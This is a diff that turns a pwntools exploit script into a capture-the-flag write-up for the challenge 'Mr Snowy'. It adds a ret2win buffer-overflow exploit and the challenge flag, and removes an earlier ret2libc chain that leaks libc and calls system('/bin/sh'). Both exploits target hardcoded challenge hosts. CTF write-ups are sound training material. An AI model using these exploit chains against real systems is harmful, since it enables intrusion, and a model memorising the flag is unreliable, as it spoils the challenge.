@@ -1,20 +1,42 @@
+# Mr Snowy
+
+## Challenge
+
+Simple binary with a buffer-overflow and a win function.
+
+### Mitigations
+
+```
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+## Solution
+
+We can overwrite the saved RIP to call a win function.
+
+## Exploit
+
+```py
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template --host 178.62.32.210 --port 30387 naughty_list
+# $ pwn template --host 178.128.35.132 --port 32342 mr_snowy
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF('naughty_list')
-libc = ELF('libc.so.6')
+exe = context.binary = ELF('mr_snowy')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141
-host = args.HOST or '178.62.32.210'
-port = int(args.PORT or 30387)
+host = args.HOST or '178.128.35.132'
+port = int(args.PORT or 32342)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -56,39 +78,17 @@ continue
 
 io = start()
 
-rop = ROP(exe)
+io.sendlineafter(b"> ", b"1")
 
 payload = flat({
-    0x20 + 0x8: [
-        rop.find_gadget(["pop rdi", "ret"])[0],
-        exe.got["puts"],
-        exe.plt["puts"],
-        exe.sym["get_descr"],
-        ],
+    0x40+0x8: exe.sym['deactivate_camera'],
     })
 
-io.sendlineafter(b":", b"a")
-io.sendlineafter(b":", b"a")
-io.sendlineafter(b":", b"18")
-io.sendlineafter(b":", payload)
-
-io.recvuntil(b"\xf0\x9f\x8e\x81")
-io.recvline()
-libc.address = u64(io.recvline()[:-1].ljust(8, b'\x00')) - libc.sym["puts"]
-
-io.sendlineafter(b":", payload)
-log.success(hex(libc.address))
-
-payload = flat({
-    0x20 + 0x8: [
-        rop.find_gadget(["ret"])[0],
-        rop.find_gadget(["pop rdi", "ret"])[0],
-        next(libc.search(b"/bin/sh")),
-        libc.sym["system"],
-        ],
-    })
-
-io.sendlineafter(b":", payload)
+io.sendlineafter(b"> ", payload)
 
 io.interactive()
+```
 
+## Flag
+
+`HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}`
